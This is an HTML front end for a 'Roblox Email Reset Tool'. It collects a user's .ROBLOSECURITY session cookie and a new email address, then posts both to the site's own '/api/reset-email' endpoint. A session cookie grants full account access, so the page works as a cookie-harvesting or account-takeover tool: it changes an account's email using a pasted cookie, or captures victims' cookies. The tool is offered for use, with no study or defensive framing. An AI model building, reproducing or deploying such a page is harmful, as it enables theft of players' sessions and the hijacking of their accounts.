<!DOCTYPE html>
<html>
<head>
  <title>Roblox Email Reset Tool</title>
</head>
<body>
  <h1>Roblox Account Email Reset</h1>
  <input type="text" id="cookieInput" placeholder="Enter .ROBLOSECURITY cookie">
  <input type="text" id="newEmail" placeholder="New email address">
  <button onclick="resetEmail()">Reset Email</button>
  <script>
    async function resetEmail() {
      const cookie = document.getElementById('cookieInput').value;
      const newEmail = document.getElementById('newEmail').value;
      const response = await fetch('/api/reset-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, newEmail })
      });
      alert(await response.text());
    }
  </script>
</body>
</html>
